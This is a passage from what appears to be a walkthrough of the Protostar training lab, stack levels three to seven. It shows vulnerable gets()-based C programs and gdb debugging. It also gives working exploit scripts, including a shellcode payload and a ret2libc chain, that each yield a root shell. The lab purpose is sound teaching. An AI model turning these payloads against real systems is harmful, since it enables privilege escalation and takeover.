</pre></table></code></div></div><p>Since the <code class="language-plaintext highlighter-rouge">gets()</code> function continues to store characters past the end of the buffer and the function pointer <code class="language-plaintext highlighter-rouge">fp</code> is declared before the <code class="language-plaintext highlighter-rouge">buffer</code> variable we can overwrite this. Since we need to get to the <code class="language-plaintext highlighter-rouge">win()</code> function we need to get the address of where it is at. We can do this by using object dump as seen below.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostar<span class="nv">$ </span>objdump <span class="nt">-D</span> ./stack3 | <span class="nb">grep </span>win
08048424 &lt;win&gt;:
</pre></table></code></div></div><p>Now that we know the address of the <code class="language-plaintext highlighter-rouge">win()</code> function and knowing that the system uses big endian we can solve the challenge</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostar<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"print 'A'*64 + '</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./stack3
calling <span class="k">function </span>pointer, jumping to 0x08048424
code flow successfully changed
</pre></table></code></div></div><h2 id="stack-four">Stack Four</h2><h3 id="source-code-4">Source Code</h3><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"code flow successfully changed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="overview-4">Overview</h3><p><code class="language-plaintext highlighter-rouge">Stack4 takes a look at overwriting saved EIP and standard buffer overflows.</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostar<span class="nv">$ </span>./stack4
<span class="nb">test</span>
</pre></table></code></div></div><h3 id="exploit-4">Exploit</h3><p>This is where things become a little more tricky than the previous challenges. We know that the end goal is to alter the program use the <code class="language-plaintext highlighter-rouge">win()</code> function and display the message. So first we wanna find out the address of where the function is stored.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostar$ objdump -D ./stack4 | grep win
080483f4 &lt;win&gt;:
</pre></table></code></div></div><p>Now that we know the address of the <code class="language-plaintext highlighter-rouge">win()</code> function is stored at <code class="language-plaintext highlighter-rouge">0x080483f4</code> can save that for later. We also want to create a file with our 64 ‘A’ to understand the size of the stack.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostar$ python -c "print 'A'*64" &gt; buffer64
</pre></table></code></div></div><p>When we run gdb in TUI mode and set the layout of <code class="language-plaintext highlighter-rouge">regs</code> and <code class="language-plaintext highlighter-rouge">asm</code> and finally set a break point on main we can passing our 64 ‘A’ by using <code class="language-plaintext highlighter-rouge">r &lt; buffer64</code> then we can check the stack by using <code class="language-plaintext highlighter-rouge">x/30x $esp</code> as shown below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-10-exploit-education-protostar-stack4/screenshot1.png" style="width: 70%" /></p><p>Right after the <code class="language-plaintext highlighter-rouge">gets()</code> which is the end of our main we return to the previous function. We can see this at <code class="language-plaintext highlighter-rouge">0x0804841d</code> in gdb. This uses the base pointer which is stored right after our stack and can be overwritten to change which function the return is going to navigate to. In order to do so we must do some math to figure out the number of bytes to change that value.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="s">'0xffffd46c'</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="nb">int</span><span class="p">(</span><span class="s">'0xffffd420'</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
<span class="mi">76</span>
</pre></table></code></div></div><p>Now that we know it takes exactly 76 bytes to overwrite the base pointer value we can craft another file to change it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python -c "print 'A'*76 + '\xf4\x83\x04\x08' " &gt; buffer64Address
</pre></table></code></div></div><p>Now once we run it we can see that the return jumped to the <code class="language-plaintext highlighter-rouge">win()</code> function and we have solved the challenge.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostar<span class="nv">$ </span>./stack4 &lt; buffer64Address 
code flow successfully changed
Segmentation fault
</pre></table></code></div></div><h2 id="stack-five">Stack Five</h2><h3 id="source-code-5">Source Code</h3><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="overview-5">Overview</h3><p><code class="language-plaintext highlighter-rouge">Stack5 is a standard buffer overflow, this time introducing shellcode.</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ ./stack5        
test
</pre></table></code></div></div><h3 id="exploit-5">Exploit</h3><p>From the source code we can see that there is no function that we are trying to jump to and that we need to provide our own shellcode. This works out perfect we can use our shellcode from the SLAE64 course to obtain a shell or use <a href="http://shell-storm.org/shellcode/">shellstorm</a>.</p><p>Since we know what we are trying to exploit the gets() function we can begin and try to find the EIP offset or the (Instruction Pointer Offset). I prefer to use pattern_create and pattern_offset that is already built into Kali.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostar<span class="nv">$ </span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</pre></table></code></div></div><p>This gives us a unique pattern to use to find the offset of the EIP. We can paste this into the program and get where the EIP is overwritten.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>(gdb) r
Starting program: /opt/protostar/bin/stack5 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) 
</pre></table></code></div></div><p>Then we can use python to figure out the ascii value for the hex that replaced the EIP register value</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> struct.pack<span class="o">(</span><span class="s2">"I"</span>, 0x63413563<span class="o">)</span>
<span class="s1">'c5Ac'</span>
</pre></table></code></div></div><p>Then use the pattern_offset script to find the exact offset</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostar<span class="nv">$ </span>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="nt">-q</span>  c5Ac <span class="nt">-l</span> 100
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 76
</pre></table></code></div></div><p>Now that we know the offset we can begin to form our exploit. Below is a photo what our stack looks like on the left and the stack on the right is what we want our stack to look like after sending our exploit code.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-10-exploit-education-protostar-stack-series/stack5.png" style="width: 50%" /></p><p>To test this out we can send 76 A’s then four B’s then 4 C’s for safe measure.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="s2">"A"</span><span class="k">*</span>76+<span class="s2">"BBBB"</span>+<span class="s2">"CCCC"</span>
<span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC'</span>
</pre></table></code></div></div><p>Pasting this into GDB</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> r
The program being debugged has been started already.
Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
Starting program: /opt/protostar/bin/stack5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span> 
</pre></table></code></div></div><p>If we take a look at the registers using the <code class="language-plaintext highlighter-rouge">info reg</code> command in GDB we can see that the EBP register (Base Pointer) was overwritten with A’s and the EIP was overwritten with B’s</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>esp            0xbffffcc0       0xbffffcc0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x42424242       0x42424242
</pre></table></code></div></div><p>Now that we have confirmed we can control the EIP value we can point this to our shellcode. We need to figure out where the “CCCC” we sent are store on the stack.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>(gdb) x/100x $esp-100 
0xbffffc5c:     0x080483d9      0xbffffc70      0xb7ec6165      0xbffffc78
0xbffffc6c:     0xb7eada75      0x41414141      0x41414141      0x41414141
0xbffffc7c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc8c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc9c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcac:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcbc:     0x42424242      0x43434343      0xbffffd00      0xbffffd6c
</pre></table></code></div></div><p>We can see that at address <code class="language-plaintext highlighter-rouge">0xbffffcc0</code> (<code class="language-plaintext highlighter-rouge">0xbffffcbc</code> + 4 ) is where our “CCCC” or <code class="language-plaintext highlighter-rouge">0x43434343</code> were placed on the stack. Now we can begin to write our exploit.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">struct</span>

<span class="n">padding</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">76</span>
<span class="n">nops</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">14</span>
<span class="n">eip</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span><span class="mh">0xbffffcc0</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span><span class="o">+</span><span class="n">eip</span><span class="o">+</span><span class="n">nops</span><span class="o">+</span><span class="n">shellcode</span>
<span class="k">print</span> <span class="n">payload</span>
</pre></table></code></div></div><p>The shellcode that I used execute the <code class="language-plaintext highlighter-rouge">/bin/dash</code> shell for us. You can find this code <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">here</a>. We will now have to save the output of this to a file.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python exploit5.py <span class="o">&gt;</span> /tmp/txt
</pre></table></code></div></div><p>We can now test this out on our binary. The dash is used to pass the file hex in as stdin.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ cat /tmp/txt - | /opt/protostar/bin/./stack5 
whoami 
root
</pre></table></code></div></div><h2 id="stack-six">Stack Six</h2><h3 id="source-code-6">Source Code</h3><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">getpath</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"input path please: "</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

  <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"bzzzt (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"got path %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">getpath</span><span class="p">();</span>
<span class="p">}</span>

</pre></table></code></div></div><h3 id="overview-6">Overview</h3><p><code class="language-plaintext highlighter-rouge">Stack6 looks at what happens when you have restrictions on the return address. This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.</code></p><h3 id="exploit-6">Exploit</h3><p>First we need to find the offset. We can use <code class="language-plaintext highlighter-rouge">pattern_create.rb</code> to create our uniqe offset.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~<span class="nv">$ </span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</pre></table></code></div></div><p>Now we can paste our unique string into the user input in GDB.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> c
Continuing.
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 <span class="k">in</span> ?? <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span> 
</pre></table></code></div></div><p>When convert <code class="language-plaintext highlighter-rouge">0x37634136</code> to ASCII using python it’s <code class="language-plaintext highlighter-rouge">6Ac7</code>.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~<span class="nv">$ </span>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="nt">-q</span>  6Ac7 <span class="nt">-l</span> 100
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 80
</pre></table></code></div></div><p>Now that we have verified that our offset is at 80 bytes we can begin to develop our exploit. Something that is very important to point out about the code is that the return addresses starting with <code class="language-plaintext highlighter-rouge">0xbf</code> are filtered, which essentially stops us from executing on the stack. Although there is a way we can get around this using ret2libc. The ret2libc takes advantage of the fact that the libc library is loaded into memory and its also used by the program. So we can set the return address to the address of any function in the C library. In order to take control of the program we will be using <code class="language-plaintext highlighter-rouge">system()</code>. We will over rite part of the stack that was set prior to calling <code class="language-plaintext highlighter-rouge">getpath()</code> and manually inject stack frames to call <code class="language-plaintext highlighter-rouge">system()</code>. We will specifically be overwriting the return address of <code class="language-plaintext highlighter-rouge">getpath()</code> with <code class="language-plaintext highlighter-rouge">system()</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-10-exploit-education-protostar-stack-series/stack6.png" style="width: 50%" /></p><p>As shown in the photo above we will replace the return address 1 of <code class="language-plaintext highlighter-rouge">getpath()</code> with <code class="language-plaintext highlighter-rouge">system()</code> and return address 2 is not important and will be explained in stack seven. Finally we will have to pass a string which is the command we want to execute, which will be <code class="language-plaintext highlighter-rouge">/bin/sh</code>. So in GDB we need to find the address of <code class="language-plaintext highlighter-rouge">system()</code>.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> p system
<span class="nv">$3</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ecffb0 &lt;__libc_system&gt;
</pre></table></code></div></div><p>Now we need to find where libc is loaded so we can call <code class="language-plaintext highlighter-rouge">/bin/sh</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> info proc map 
process 11431
cmdline <span class="o">=</span> <span class="s1">'/opt/protostar/bin/stack6'</span>
cwd <span class="o">=</span> <span class="s1">'/opt/protostar/bin'</span>
exe <span class="o">=</span> <span class="s1">'/opt/protostar/bin/stack6'</span>
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
         0x804a000  0x806b000    0x21000          0           <span class="o">[</span>heap]
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fde000 0xb7fe2000     0x4000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           <span class="o">[</span>vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           <span class="o">[</span>stack]
</pre></table></code></div></div><p>Now that we know where libc starts at address <code class="language-plaintext highlighter-rouge">0xb7e97000</code>. Since <code class="language-plaintext highlighter-rouge">/bin/sh</code> is a string on in libc we can find the offset from the start of the file. In order to do this we can use the <code class="language-plaintext highlighter-rouge">-t x</code> to display the the offset in hex.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>user@protostar:/opt/protostar/bin<span class="nv">$ </span>strings <span class="nt">-a</span> <span class="nt">-t</span> x /lib/libc-2.11.2.so | <span class="nb">grep</span> /bin/sh
 11f3bf /bin/sh
</pre></table></code></div></div><p>We can see that the offset is at <code class="language-plaintext highlighter-rouge">0x11f3bf</code> we can find the exact offset in memory since we know the base address is <code class="language-plaintext highlighter-rouge">0xb7e97000</code>.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mh">0xb7e97000</span> <span class="o">+</span> <span class="mh">0x11f3bf</span><span class="p">)</span>
<span class="s">'0xb7fb63bf'</span>
</pre></table></code></div></div><p>If we go back into GDB we can verify this:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> x/s 0xb7fb63bf
0xb7fb63bf:  <span class="s2">"/bin/sh"</span>
</pre></table></code></div></div><p>The final exploit script is:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">struct</span>
<span class="n">offset</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">80</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">);</span>
<span class="n">shell</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xb7fb63bf</span><span class="p">);</span>
<span class="k">print</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="s">'AAAA'</span> <span class="o">+</span> <span class="n">shell</span> 
</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>user@protostar:/opt/protostar/bin<span class="nv">$ </span>python /tmp/exploit6.py <span class="o">&gt;</span> /tmp/txt2
user@protostar:/opt/protostar/bin<span class="nv">$ </span><span class="o">(</span><span class="nb">cat</span> /tmp/txt2<span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./stack6   
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA����AAAA�c��
<span class="nb">whoami
</span>root
</pre></table></code></div></div><h2 id="stack-seven">Stack Seven</h2><h3 id="source-code-7">Source Code</h3><div class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">char</span> <span class="o">*</span><span class="nf">getpath</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"input path please: "</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

  <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"bzzzt (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"got path %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
